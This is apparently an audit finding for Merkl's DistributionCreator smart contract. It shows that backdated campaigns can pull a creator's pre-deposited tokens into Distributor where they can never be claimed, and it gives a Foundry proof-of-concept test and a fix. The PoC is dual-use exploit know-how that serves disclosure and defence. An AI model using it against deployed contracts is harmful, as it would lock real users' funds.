  "body": "## Summary\n`_createCampaign` never enforces that `startTimestamp` (or end time) is in the future. An operator with creator allowance can create a campaign that already ended; the contract still pulls tokens from the creator into Distributor, but no Merkle root will ever be produced for the finished campaign, leaving funds idle and unrecoverable by the creator.\n\n## Impact\n- Authorized operators (or compromised EOAs) can permanently lock a creator’s predeposited rewards in Distributor while also charging fees.\n- Loss equals the full campaign amount per abused creation; recovery would require governor intervention outside the intended trust model.\n\n## Root Cause\n- `_createCampaign` checks only `duration >= HOUR` and whitelist/min amounts; it omits `startTimestamp >= block.timestamp` and `startTimestamp + duration > block.timestamp` (DistributionCreator.sol:526-543).\n- `_pullTokens` immediately transfers campaign funds to Distributor even if the campaign is already over (DistributionCreator.sol:585-607).\nLink: https://github.com/code-423n4/2025-11-merkl/blob/main/contracts/DistributionCreator.sol#L526-L607",
  "proof_of_concept": "Run the included Foundry test:\n```bash\nforge test --match-test test_H2_PastCampaignMovesFundsAndStrandsThem -vv\n```\n\nFull PoC code (test/c4/H2PoC.t.sol):\n```solidity\n// SPDX-License-Identifier: UNLICENSED\n\npragma solidity ^0.8.17;\n\nimport { CampaignParameters } from \"../../contracts/struct/CampaignParameters.sol\";\nimport { DistributionCreator } from \"../../contracts/DistributionCreator.sol\";\nimport { Distributor, MerkleTree } from \"../../contracts/Distributor.sol\";\nimport { IAccessControlManager } from \"../../contracts/interfaces/IAccessControlManager.sol\";\nimport { Fixture } from \"../Fixture.t.sol\";\nimport { IERC20 } from \"@openzeppelin/contracts/token/ERC20/IERC20.sol\";\n\n/// @dev PoC for H2: operator creates a campaign whose end time is already in the past.\n/// Tokens are pulled from the creator balance into Distributor even though the campaign\n/// can never be processed by the off-chain engine, leaving funds stranded.\ncontract H2PoC is Fixture {\n    Distributor internal distributor;\n\n    function setUp() public override {\n        super.setUp();\n\n        // Deploy a real Distributor and point creator to it\n        distributor = Distributor(deployUUPS(address(new Distributor()), hex\"\"));\n        distributor.initialize(IAccessControlManager(address(accessControlManager)));\n        vm.prank(governor);\n        creator.setNewDistributor(address(distributor));\n\n        // whitelist reward token and set dispute params (not relevant for the bug)\n        vm.startPrank(guardian);\n        address[] memory tokens = new address[](1);\n        uint256[] memory amounts = new uint256[](1);\n        tokens[0] = address(angle);\n        amounts[0] = 1e8;\n        creator.setRewardTokenMinAmounts(tokens, amounts);\n        vm.stopPrank();\n\n        vm.startPrank(governor);\n        distributor.setDisputeToken(angle);\n        distributor.setDisputeAmount(1);\n        distributor.setDisputePeriod(0);\n        vm.stopPrank();\n\n        // Creator pre-deposits rewards and authorizes operator (bob)\n        angle.mint(alice, 100e18);\n        vm.startPrank(alice);\n        angle.approve(address(creator), type(uint256).max);\n        creator.increaseTokenBalance(alice, address(angle), 100e18);\n        creator.increaseTokenAllowance(alice, bob, address(angle), 100e18);\n        vm.stopPrank();\n    }\n\n    function test_H2_PastCampaignMovesFundsAndStrandsThem() public {\n        // Advance time so backdating calculation does not underflow\n        vm.warp(10 days);\n        // Craft campaign that already ended 2 hours ago\n        CampaignParameters memory params = CampaignParameters({\n            campaignId: bytes32(0),\n            creator: alice,\n            rewardToken: address(angle),\n            amount: 100e18,\n            campaignType: 1,\n            startTimestamp: uint32(block.timestamp - 2 * EPOCH_DURATION),\n            duration: EPOCH_DURATION, // ended 1 hour ago\n            campaignData: hex\"\"\n        });\n\n        uint256 creatorBalBefore = creator.creatorBalance(alice, address(angle));\n        uint256 distributorBalBefore = angle.balanceOf(address(distributor));\n\n        // Operator with allowance creates the backdated campaign\n        vm.prank(bob);\n        bytes32 cid = creator.createCampaign(params);\n        assertTrue(cid != bytes32(0), \"campaign created\");\n\n        // Funds pulled from creator and sent to distributor (net of fee)\n        uint256 creatorBalAfter = creator.creatorBalance(alice, address(angle));\n        uint256 distributorBalAfter = angle.balanceOf(address(distributor));\n        assertEq(creatorBalAfter, 0, \"predeposit drained\");\n        assertGt(distributorBalAfter, distributorBalBefore, \"distributor received funds\");\n\n        // No Merkle root exists -> claims impossible; funds now idle\n        bytes32[][] memory proofs = new bytes32[][](1);\n        proofs[0] = new bytes32[](0);\n        address[] memory users = new address[](1);\n        address[] memory tokens = new address[](1);\n        uint256[] memory amounts = new uint256[](1);\n        users[0] = alice;\n        tokens[0] = address(angle);\n        amounts[0] = distributorBalAfter; // try claim everything\n\n        vm.expectRevert(); // InvalidUninitializedRoot\n        vm.prank(alice);\n        distributor.claim(users, tokens, amounts, proofs);\n    }\n}\n```\n\n## Recommended Mitigation\n- Require `newCampaign.startTimestamp >= block.timestamp` and `newCampaign.startTimestamp + newCampaign.duration > block.timestamp` in `_createCampaign`.\n- Optionally align start to epoch boundaries and add a reclaim path for campaigns never rooted.",
